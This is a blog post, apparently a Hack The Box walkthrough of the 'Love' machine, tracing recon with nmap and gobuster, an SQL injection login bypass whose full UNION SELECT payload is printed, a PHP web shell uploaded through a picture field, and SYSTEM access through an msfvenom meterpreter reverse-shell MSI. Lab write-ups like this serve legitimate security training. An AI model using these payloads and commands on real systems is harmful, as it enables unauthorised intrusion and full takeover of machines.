<html>
<head>
	<title>HTB: Love</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="/CSS/blog.css">
	<link rel="stylesheet" href="/CSS/global.css">
</head>
<body class="noselect">
	<h1 id="title" class="blog_title">
		<a href="/index.html" class="homelink">
			HTB: Love
		</a>
	</h1>
	<div id="big_wrapper" class="wordwrap">
		<div class="paragraph">
			<span id="menu_button" class="menu_item">...</span>
			<div id="menu">
				<a href="/index.html" class="menu_item">Home</a>
				<a href="/Blogs/TLDR/htb_love.html" class="menu_item">TLDR</a>
				<a href="/Blogs/index.html" class="menu_item">All Blogs</a>
				<a href="/Blogs/resources.html" class="menu_item">Resources</a>
			</div>
			<hr>
		</div>
		<div class="paragraph">
			<p class="subtitle">Intro:</p>
			<p class="content">So. This was a fun box. It took me a hot second to solve due to me getting tunnel-vision over the login page, but this hyperfixation ended up being part of the solution!</p>
			<p class="content"><b>SPOILER ALERT: </b>I found an SQL injection which was probably not the intended solution (especially compared to all the other solutions out there).</p>
		</div>
		<div class="paragraph">
			<p class="subtitle">Recon:</p>
			<p class="content">As always we do <span class="code">nmap -sT -sV -v &ltip&gt</span> to find open ports. This shows us quite a few, but we notice a web server, which we'll check out.</p>
			<p class="content">Before we start snooping around in the browser, we can start gobuster to check for directories: <span class="code">gobuster dir -u &ltip&gt -w &ltpath/to/dict/&gt</span>.
		</div>
		<div class="paragraph">
			<p class="subtitle">Exploration:</p>
			<p class="content">We are presented with a voting page. For what? We will never know. Anyways, we can start looking around, trying to determine if the site is using a CMS or has some version of anything displayed. Nothing. So we go back to the login page and try some arbitrary values (namely '0'). All of them show the same error: Voter ID not found.</p>
	 		<p class="content">Next, we try some good 'ol SQL injection: <span class="code">0'OR '1'='1</span>. To our surprise we get an "Incorrect password" error! This means the page is vulnerable to an SQL injection! What exactly the injection is? I'm not sure, but after a very looong session of trial and many errors, we realize the page title is quite specific: "Voting System in PHP". I then get the genius idea to check Exploit DB for an SQL injection against "Voting System in PHP". We're plesantly presented with a couple results, one of which is exactly what we're looking for! <a href="#ref_1" class="link">[1]</a></p>
		</div>
		<div class="paragraph">
			<p class="subtitle">Hacking the Login:</p>
			<p class="content">Checking the gobuster results yeilds us the admin login page, which looks exactly like the voters login page. Using our PoC injection from before, we see that this page is also vulnerable. We can then read the newly discovered exploits how-to and use burpsuite to relay the info we need. Something I've found is that the "login" value should be empty. I also change the password to "passie" and replace the bcrypt string with the appropriate value. This is the full payload: </br><span class="code">password=passie&username=notadmin' UNION SELECT 1,2,"$2a$12$TkzTU9cx01SFg9efTzbkJea8QzdMebNJTVyPYEvOESXGFYLSr1xEO",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -&login=""</span>. Once we POST this payload to the login page we're greeted with the admin home page.</p>
			<div class="image">
				<img src="./Pics/votingsystem.png">
				<p class="imgsub">Admin page</p>
			</div>
		</div>
		<div class="paragraph">
			<p class="subtitle">Uploading Pictu- Files:</p>
			<p class="content">As we look around the page we come across a tab: "Voters". Within this tab we're able to create a new voter, which we name "Hacker Mike". We can also upload a picture. Hmm..... Through our malicious ideologies, we try uploading a php file which doesn't throw any errors. By checking inspect elements we can see the directory these "pictures" are held is in "/images". We check and TADA! Our file is there!</p>
			<div class="image">
				<img src="./Pics/addingvoter.png">
				<p class="imgsub">Creating a new voter while uploading a PHP reverse shell</p>
			</div>
		</div>
		<div class="paragraph">
			<p class="subtitle">Getting User:</p>
			<p class="content">We can directly access our file which brings us a web shell, with the GET key being "miked". Web shells are kinda crapy though. We can get a reverse shell going with a PowerShell one-liner <a href="#ref_2" class="link">[2]</a>. Once we have a better shell we can comfortably find the flag file at "C:\Users\Phoebe\Desktop\user.txt"</p>
			<div class="image">
				<img src="./Pics/user.png">
				<p class="imgsub">Location of user.txt file (No spoilers!)</p>
			</div>
		</div>
		<div class="paragraph">
			<p class="subtitle">Getting Root:</p>
			<p class="content">With user out of the way, we move on to root! We can upload winPEAS to the server the same way we did our php web shell, or we can pull it up using <span class="code">Invoke-WebRequest</span>. Whichever tickled your fancy, we should now be able to execute winPEAS. What I've done is sent the output to a file so I can pull it down to my machine for analysis (The output excedes the max lines of my terminal, so I don't see a lot of output). To read this file we need to use "more", which understands ANSI colour codes.</p>
			<p class="content">Looking through the report we find that both "AlwaysInstallElevated" registers are set to 1. This means we can "install" any .msi file as NT AUTHORITY/SYSTEM. We can generate a reverse shell using msfvenom: <span class="code">msfvenom -p windows/meterpreter/reverse_tcp -f msi lhost=&ltip&gt lport=3188 > hacked.msi</span>. As mich as I hate using meterpreter, I've not had luck using a generic shell.</p>
			<p class="content">Once we establish the shell we can verify our godly status with <span class="code">whoami</span>, which returns an exciting "nt authority\system"! We can then find the root flag at "C"\Users\Administrator\Desktop\root.txt"! Bam! We've successfully owned the Love box!</p>
			<div class="image">
				<img src="./Pics/root.png">
				<p class="imgsub"><span class="code">whoami</span> plus location of root.txt (No spoilers!)</p>
			</div>
		</div>
		</br>
		</br>
		</br>
		<div class="paragraph res_list">
			<p class="subtitle">Resources:</p>
			<p class="content">
				<a id="ref_2" href="https://www.exploit-db.com/exploits/49843" class="menu_item" target="_blank">Exploit DB SQL Injection</a>&nbsp<b>[EXTERNAL]</b>
			</p>
			</br>
			<p class="content">
				<a id="ref_1" href="/Blogs/resources.html#rshell_powershell_oneliner" class="menu_item" target="_blank">PowerShell One-Liner</a>
			</p>
		</div>
		<br>
		<div class="paragraph">
			<hr>
			<p class="content">Date created: 2021.08.20</p>
		</div>
	</div>
</body>
<footer>
	<script type="text/javascript" src="/JS/blog.js"></script>
	<script type="text/javascript" src="/JS/cookies.js"></script>
</footer>
</html>
